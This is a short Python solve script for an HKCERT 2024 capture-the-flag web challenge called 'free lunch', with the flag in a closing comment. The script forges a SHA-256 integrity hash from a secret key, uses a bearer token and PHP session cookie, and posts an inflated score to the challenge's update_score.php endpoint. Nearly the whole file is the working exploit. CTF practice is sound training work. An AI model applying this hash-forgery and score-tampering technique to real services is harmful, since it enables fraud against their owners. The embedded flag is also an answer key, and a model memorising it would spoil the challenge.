import requests 
import hashlib
url = "https://c08-new-free-lunch-0.hkcert24.pwnable.hk"

token = "3536e95a0802dae2590404a2bf5f008b"
secretKey = b"3636f69fcc3760cb130c1558ffef5e24"
hash = hashlib.sha256(secretKey + b"whatur" + b"301").hexdigest()

print(hash)
r = requests.post(
    f"{url}/update_score.php", 
    headers={
        "Authorization": f"Bearer {token}"
    },
    cookies={"PHPSESSID": "dc4c42a8a27661c0df31e77a924da74b"},
    json={
        "hash": hash,
        "score": 301
    }
)
print(r.text)

# hkcert24{r3d33m_f0r_4_fr33_lunch}